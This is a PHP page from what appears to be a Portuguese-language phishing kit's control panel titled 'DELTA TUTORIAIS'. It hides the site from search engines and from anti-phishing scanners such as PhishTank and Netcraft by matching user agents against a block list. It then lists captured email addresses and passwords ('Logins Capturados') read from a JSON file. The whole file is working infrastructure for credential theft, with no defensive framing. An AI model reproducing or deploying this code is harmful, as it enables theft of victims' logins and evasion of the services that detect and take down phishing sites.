<?php
session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS ||-----------------------------------------------------//
include "../anti/antibots1.php";
include "../anti/antibots2.php";
include "../anti/antibots3.php";
include "../anti/antibots4.php";
include "../anti/antibots5.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
	'phishtank',
	'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 

function geraURL($tamanho = 100, $maiusculas = true, $numeros = true, $simbolos = true){ 
    $lmin = 'abcdefghijklmnopqrstuvwxyz'; 
    $lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $num = '1234567890'; 
    $simb = '#-/'; 
    $retorno = ''; 
    $caracteres = ''; 
     
    $caracteres .= $lmin; 
        if ($maiusculas) $caracteres .= $lmai; 
        if ($numeros) $caracteres .= $num; 
        if ($simbolos) $caracteres .= $simb; 
     
    $len = strlen($caracteres); 
    for ($n = 1; $n <= $tamanho; $n++) { 
    $rand = mt_rand(1, $len); 
    $retorno .= $caracteres[$rand-1]; 
    } 
    return $retorno; 
} 
$url = geraURL(87); 
?>


<?php
if (!isset($_COOKIE['login'])) {
	header("location:login.php");
}
$fl = "contador.json";
if(file_exists($fl)){
	$h = fopen($fl, "r");
	$arr = json_decode(fread($h, filesize ($fl)));
	fclose($h);
	for($i = 0; $i < count($arr); $i++){
		$visitas = "".$arr[$i][0]."";
	}
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>DELTA TUTORIAIS</title>
	<link rel="stylesheet" type="text/css" href="css/index.css">
	<link rel="stylesheet" type="text/css" href="font-awesome-4.7.0/css/font-awesome.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<meta charset="utf-8">
	<script type="text/javascript">
		$(document).ready(function() {
			$("td.status").each(function(index, el) {
				if ($(this).html() == "Nova") {
					var audio = new Audio('new-info1.mp3');
					audio.play();
					return false;
				}
			});
			setTimeout(function() {
				location.reload();
			}, 3000);
		});
	</script>
	<style>
		.button {
  background-color: #555555; /* Green */
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
}
	</style>
</head>
<body>

	<?php require 'header.php'; ?>


	<div class="clientes">
		<div class="container">
		
		<a href="boleto1.php"><button class="button">PAINEL DELTA 1.0</button></a>

			<div class="header">
				<i class="fa fa-users" aria-hidden="true"></i><p>Logins Capturados</p>
			</div>
			<table>
				<tr>
					<th>STATUS</th>
					<th>EMAIL</th>
					<th>SENHA</th>
					
					<th>OPÇÕES</th>
				</tr>


<?php

ini_set("display_errors",0);
error_reporting(0);


$fl = "./seguro/boleto1.json";
if(file_exists($fl)){
	$h = fopen($fl, "r");
	$arr = json_decode(fread($h, filesize ($fl)));
	fclose($h);
	for($i = 0; $i < count($arr); $i++){
		echo "
                    <tr class='user'>
					<td class='status1'>NOVO</td>
					<td>".$arr[$i][0]."</td>
					<td>".$arr[$i][1]."</td>
					
					<td><a href='./processar/remover.php?apg=".$i."&pagina=4'><button>APAGAR</button></a></td>
                    </tr>
                ";
	}
}
?>


			</table>
		</div>
	</div>



	<?php require 'footer.php'; ?>

</body>
</html>